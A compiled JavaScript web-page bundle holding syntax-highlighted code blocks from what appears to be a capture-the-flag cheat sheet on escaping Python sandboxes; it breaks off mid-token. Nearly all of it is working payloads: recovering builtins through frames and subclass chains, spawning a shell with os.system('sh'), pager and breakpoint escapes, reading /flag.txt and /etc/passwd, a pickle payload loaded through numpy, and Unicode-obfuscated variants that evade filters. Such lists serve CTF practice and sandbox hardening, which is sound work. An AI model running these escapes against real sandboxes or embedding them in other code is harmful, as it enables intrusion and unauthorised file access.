import{S as kw,i as iw,s as _w,C as sd,w as dw,x as fw,y as mw,z as bw,A as qg,f as yw,t as gw,B as ww,Y as zg,l as p,r as k,a as u,m as t,n as o,u as i,h as n,c as r,p as l,b as c,J as a,E as vw}from"../../chunks/index-f2a82808.js";import{L as Ew}from"../../chunks/layout-d6e193e1.js";import"../../chunks/utils-e126d158.js";function hw(Wa){let d,v,O,q,_,m,Ya,cc,$,Ga,ir,lc,J,Yg=`<code class="language-py"><span class="token comment"># obtain builtins from a globally defined built-in functions</span>
<span class="token comment"># https://docs.python.org/3/library/functions.html</span>
<span class="token keyword">print</span><span class="token punctuation">.</span>__self__
__build_class__<span class="token punctuation">.</span>__self__
<span class="token builtin">__import__</span><span class="token punctuation">.</span>__self__

<span class="token comment"># obtain builtins from site-module constants</span>
<span class="token comment"># https://docs.python.org/3/library/constants.html#constants-added-by-the-site-module</span>
<span class="token builtin">help</span><span class="token punctuation">.</span>__call__<span class="token punctuation">.</span>__builtins__ <span class="token comment"># or __globals__</span>
<span class="token builtin">help</span><span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span> <span class="token comment"># can chain with sys.modules</span>
license<span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__builtins__ <span class="token comment"># or __globals__</span>
license<span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span> <span class="token comment"># can chain with sys.modules</span>

<span class="token comment"># obtain the builtins from a defined function</span>
func<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>
<span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__globals__

<span class="token comment"># obtain builtins from generators</span>
<span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_builtins
<span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span>
<span class="token punctuation">(</span><span class="token keyword">await</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ag_frame<span class="token punctuation">.</span>f_builtins
<span class="token punctuation">(</span><span class="token keyword">await</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ag_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span></code>`,uc,K,Va,_r,rc,Z,Gg=`<code class="language-py">breakpoint<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># pdb -> import os; os.system("sh")</span>
<span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># import os; os.system("sh")</span>
<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># __import__("os").system("sh")</span>

<span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># less pager -> !/bin/sh</span>
<span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># less pager -> :e/flag.txt</span>

<span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span> <span class="token punctuation">[</span> <span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span>
<span class="token comment"># to stderr</span>
<span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">float</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
exit<span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
exit<span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"/flag.txt"</span><span class="token punctuation">,</span><span class="token string">"exec"</span><span class="token punctuation">)</span>
<span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># to stdout</span>
<span class="token builtin">help</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span>

<span class="token comment"># https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#read-file-with-builtins-help-and-license</span>
license<span class="token punctuation">.</span>_Printer__filenames <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'/flag.txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> license<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># [license() for license._Printer__filenames in [['/flag.txt']]]</span></code>`,kc,X,$a,dr,ic,Q,Vg=`<code class="language-py"><span class="token comment"># &lt;class '_frozen_importlib.BuiltinImporter'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># &lt;class '_frozen_importlib_external.FileLoader'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"/flag.txt"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class '_io._IOBase'> -> &lt;class '_io._RawIOBase'> -> &lt;class '_io.FileIO'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">111</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'os._wrap_close'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">]</span><span class="token punctuation">.</span>close<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'subprocess.Popen'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">262</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"cat"</span><span class="token punctuation">,</span><span class="token string">"/flag.txt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token comment"># &lt;class 'abc.ABC'> -> &lt;class 'abc.ABCMeta'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">129</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'collections.Counter'></span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>copy<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>update<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'generator'> - instance</span>
<span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__loader__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'async_generator'> - instance</span>
<span class="token punctuation">(</span><span class="token keyword">await</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ag_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span><span class="token string">"_loader_"</span><span class="token string">"_"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token keyword">await</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ag_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span><span class="token string">"_builtins_"</span><span class="token string">"_"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token string">"_import_"</span><span class="token string">"_('os').system('sh')"</span><span class="token punctuation">)</span></code>`,_c,ss,Ja,fr,dc,ns,$g=`<code class="language-py"><span class="token comment"># sys</span>
sys <span class="token operator">=</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"sys"</span><span class="token punctuation">)</span>
io <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">.</span>__self__<span class="token punctuation">;</span> sys <span class="token operator">=</span> io<span class="token punctuation">.</span>__loader__<span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"sys"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
builtins <span class="token operator">=</span> <span class="token keyword">print</span><span class="token punctuation">.</span>__self__<span class="token punctuation">;</span> sys <span class="token operator">=</span> builtins<span class="token punctuation">.</span>__loader__<span class="token punctuation">.</span>create_module<span class="token punctuation">(</span><span class="token punctuation">[</span>builtins<span class="token punctuation">.</span>__spec__ <span class="token keyword">for</span> builtins<span class="token punctuation">.</span>__spec__<span class="token punctuation">.</span>name <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"module_name"</span><span class="token punctuation">]</span> <span class="token comment"># contains most of the builtin modules alongside frozen imports (https://docs.python.org/3/library/index.html)</span>
sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
sys<span class="token punctuation">.</span>breakpointhook<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># same as breakpoint()</span>
sys<span class="token punctuation">.</span>_getframe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># _io</span>
io <span class="token operator">=</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"_io"</span><span class="token punctuation">)</span>
io <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">.</span>__self__

io<span class="token punctuation">.</span>FileIO<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>raw<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># numpy</span>
numpy<span class="token punctuation">.</span>fromfile<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>numpy<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span>
numpy<span class="token punctuation">.</span>rec<span class="token punctuation">.</span>fromfile<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">,</span> formats<span class="token operator">=</span><span class="token string">"i1"</span><span class="token punctuation">)</span>
numpy<span class="token punctuation">.</span>loadtxt<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span> <span class="token comment"># stderr</span>

numpy<span class="token punctuation">.</span>savetxt<span class="token punctuation">(</span><span class="token string">"/tmp/exp"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"\\x80\\x04\\x95\\x18\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x02os\\x8c\\x06system\\x93\\x94\\x94h\\x01\\x8c\\x02sh\\x85R."</span><span class="token punctuation">]</span><span class="token punctuation">,</span> fmt<span class="token operator">=</span><span class="token string">'%s'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"latin-1"</span><span class="token punctuation">)</span> <span class="token comment"># any pickle to execute, ie: &#96;pickora -c 'from os import system; system("sh")'&#96;</span>
numpy<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"/tmp/exp"</span><span class="token punctuation">,</span> allow_pickle<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token comment"># https://numpy.org/doc/stable/reference/generated/numpy.load.html</span></code>`,fc,as,Ka,mr,mc,ps,Za,br,bc,ts,Jg=`<code class="language-py"><span class="token decorator annotation punctuation">@exec</span>
<span class="token decorator annotation punctuation">@input</span>
<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment"># or class a:pass</span>

<span class="token decorator annotation punctuation">@print</span>
<span class="token decorator annotation punctuation">@set</span>
<span class="token decorator annotation punctuation">@open</span>
<span class="token decorator annotation punctuation">@input</span>
<span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token decorator annotation punctuation">@print</span>&#92;r@<span class="token builtin">set</span>&#92;r@<span class="token builtin">open</span>&#92;r@<span class="token builtin">input</span>&#92;rclass\\x0ca<span class="token punctuation">:</span><span class="token keyword">pass</span></code>`,yc,os,Xa,yr,gc,es,Kg=`<code class="language-py"><span class="token comment"># https://lingojam.com/ItalicTextGenerator</span>

<span class="token comment"># no ASCII</span>
\u{1D623}\u{1D633}\u{1D626}\u{1D622}\u{1D62C}\u{1D631}\u{1D630}\u{1D62A}\u{1D62F}\u{1D635}<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># import os;os.system("/bin/sh")</span>

<span class="token comment"># no ASCII letters, no double underscores, inside eval</span>
_\uFF3F\u{1D62A}\u{1D62E}\u{1D631}\u{1D630}\u{1D633}\u{1D635}\uFF3F_<span class="token punctuation">(</span>\u{1D62A}\u{1D62F}\u{1D631}\u{1D636}\u{1D635}<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span>\u{1D62A}\u{1D62F}\u{1D631}\u{1D636}\u{1D635}<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># double underscore bypass by having underscore + unicode underscore (https://www.compart.com/en/unicode/U+005F) -> U+FE33, U+FE34, U+FE4D, U+FE4E, U+FE4F, U+FF3F</span>

<span class="token comment"># no ASCII letters, no double underscores, no builtins, inside eval</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D62E}\u{1D633}\u{1D630}\uFF3F_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\u{1D62D}\u{1D630}\u{1D622}\u{1D625}_\u{1D62E}\u{1D630}\u{1D625}\u{1D636}\u{1D62D}\u{1D626}<span class="token punctuation">(</span><span class="token string">"\\157\\163"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token punctuation">(</span><span class="token string">"\\57\\142\\151\\156\\57\\163\\150"</span><span class="token punctuation">)</span>

<span class="token comment"># no ASCII letters, no double underscores, no builtins, no quotes/double quotes inside eval (>= python3.8)</span>
<span class="token punctuation">[</span>\u{1D63A}<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">,</span>\u{1D622}<span class="token operator">:=</span>y<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D62E}\u{1D633}\u{1D630}\uFF3F_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\u{1D62D}\u{1D630}\u{1D622}\u{1D625}_\u{1D62E}\u{1D630}\u{1D625}\u{1D636}\u{1D62D}\u{1D626}<span class="token punctuation">(</span>\u{1D63A}<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token operator">+</span>\u{1D622}<span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token punctuation">(</span>\u{1D622}<span class="token operator">+</span>\u{1D63A}<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token comment"># no ASCII letters, no double underscores, no builtins, no quotes/double quotes, no square brackets inside eval (>= python3.8)</span>
<span class="token punctuation">(</span>\u{1D625}<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">,</span>d<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F<span class="token builtin">dir</span>\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span>\u{1D634}<span class="token operator">:=</span>\u{1D625}<span class="token punctuation">.</span>\u{1D631}\u{1D630}\u{1D631}<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\u{1D625}<span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D62E}\u{1D633}\u{1D630}\uFF3F_<span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D631}\u{1D630}\u{1D631}<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D631}\u{1D630}\u{1D631}<span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D62D}\u{1D630}\u{1D622}\u{1D625}_\u{1D62E}\u{1D630}\u{1D625}\u{1D636}\u{1D62D}\u{1D626}<span class="token punctuation">(</span>\u{1D625}<span class="token punctuation">.</span>\u{1D631}\u{1D630}\u{1D631}<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token operator">+</span>\u{1D634}<span class="token punctuation">)</span><span class="token 